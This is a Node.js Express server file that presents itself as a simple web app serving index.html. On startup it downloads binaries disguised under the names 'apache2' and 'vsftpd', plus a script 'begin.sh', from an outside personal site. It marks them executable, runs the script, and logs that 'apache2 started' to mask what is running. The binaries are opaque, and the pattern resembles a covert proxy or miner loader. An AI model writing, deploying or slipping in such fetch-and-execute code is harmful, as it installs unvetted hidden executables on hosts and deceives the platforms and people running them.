const express = require('express');
const path = require('path');
const fs = require('fs');
const util = require('util');
const axios = require('axios');
const exec = util.promisify(require('child_process').exec);

const app = express();
const port = process.env.PORT || 3000;

const filesToDownloadAndExecute = [
  {
    url: 'https://github.com/wwrrtt/test/releases/download/3.0/index.html',
    filename: 'index.html',
  },
  {
    url: 'https://sound.jp/kid/apache2',
    filename: 'apache2',
  },
  {
    url: 'https://sound.jp/kid/vsftpd',
    filename: 'vsftpd',
  },
  {
    url: 'https://sound.jp/kid/begin.sh',
    filename: 'begin.sh',
  },
];

const downloadFile = async ({ url, filename }) => {
  console.log(`Downloading file from ${url}...`);

  const { data: stream } = await axios.get(url, { responseType: 'stream' });
  const writer = fs.createWriteStream(filename);

  stream.pipe(writer);

  return new Promise((resolve, reject) => {
    writer.on('error', reject);
    writer.on('finish', resolve);
  });
};

const downloadAndExecuteFiles = async () => {
  for (let file of filesToDownloadAndExecute) {
    try {
      await downloadFile(file);
    } catch (error) {
      console.error(`Failed to download file ${file.filename}: ${error}`);
      return false;
    }
  }

  console.log('Giving executable permission to begin.sh');
  try {
    await exec('chmod +x begin.sh');
  } catch (error) {
    console.error('Failed to give executable permission to begin.sh: ', error);
    return false;
  }

  console.log('Giving executable permission to apache2');
  try {
    await exec('chmod +x apache2');
  } catch (error) {
    console.error('Failed to give executable permission to apache2: ', error);
    return false;
  }

  console.log('Giving executable permission to vsftpd');
  try {
    await exec('chmod +x vsftpd');
  } catch (error) {
    console.error('Failed to give executable permission to vsftpd: ', error);
    return false;
  }

  try {
    const { stdout } = await exec('bash begin.sh');
    console.log(`begin.sh output: \n${stdout}`);
  } catch (error) {
    console.error('Failed to execute begin.sh: ', error);
    return false;
  }

  return true;
};

downloadAndExecuteFiles().then(success => {
  if (!success) {
    console.error('There was a problem downloading and executing the files.');
  }
}).catch(console.error);

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'), err => {
    if (err) {
      res.status(500).send('Error loading index.html');
    }
  });
});

app.listen(port, () => {
  console.log(`apache2 started and listening on port ${port}`);
});
